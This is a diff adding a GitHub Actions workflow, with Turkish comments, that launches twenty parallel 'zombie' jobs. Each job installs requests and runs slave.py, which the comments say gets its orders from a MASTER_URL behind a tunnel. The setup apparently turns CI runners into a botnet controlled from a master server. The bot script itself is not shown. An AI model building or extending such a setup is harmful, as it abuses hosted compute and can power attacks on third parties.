@@ -1,0 +1,31 @@
+name: Ordu Harekatı 🚀
+
+on:
+  workflow_dispatch: # Bu komut, senin manuel olarak "BAŞLAT" butonuna basmanı sağlar.
+
+jobs:
+  zombi_mangasi:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        # Burada 20 tane zombi tanımlıyoruz. Sayıyı artırırsan GitHub sıraya alır.
+        zombi_no: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    
+    steps:
+      - name: Depoyu Cek
+        uses: actions/checkout@v3
+
+      - name: Python Kur
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.9'
+
+      - name: Bagimliliklari Yukle
+        run: pip install requests
+
+      - name: Zombiyi Atesle
+        run: python3 slave.py
+        env:
+          # Eğer slave.py içinde tünel linkini değişkenden alıyorsan buraya yazabilirsin.
+          # Şimdilik direkt slave.py içindeki MASTER_URL'i kullanacaktır.
+          PYTHONUNBUFFERED: 1
